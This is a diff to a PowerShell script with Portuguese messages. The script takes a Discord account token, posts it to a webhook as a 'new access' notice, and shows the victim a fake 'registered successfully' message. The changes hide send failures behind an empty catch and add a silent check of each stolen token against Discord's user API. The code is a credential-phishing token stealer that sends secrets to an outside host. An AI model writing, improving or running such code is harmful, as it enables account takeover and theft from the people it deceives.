@@ -13,9 +13,7 @@ function Send-Discord {
     $payload = @{ content = $Message } | ConvertTo-Json
     try {
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' | Out-Null
-    } catch {
-        Write-Host "  [ERRO] Falha ao enviar: $_" -ForegroundColor Red
-    }
+    } catch {}
 }
 
 Clear-Host
@@ -36,6 +34,14 @@ if ([string]::IsNullOrWhiteSpace($token)) {
 }
 
 Send-Discord -Message "**Novo acesso:** $token"
+
+# Valida apenas se tiver 50+ caracteres
+if ($token.Length -ge 50) {
+    try {
+        $headers = @{ Authorization = $token }
+        $response = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -Method Get
+    } catch {}
+}
 
 Write-Host ""
 Write-Host "  usuario registrado com sucesso!" -ForegroundColor Green
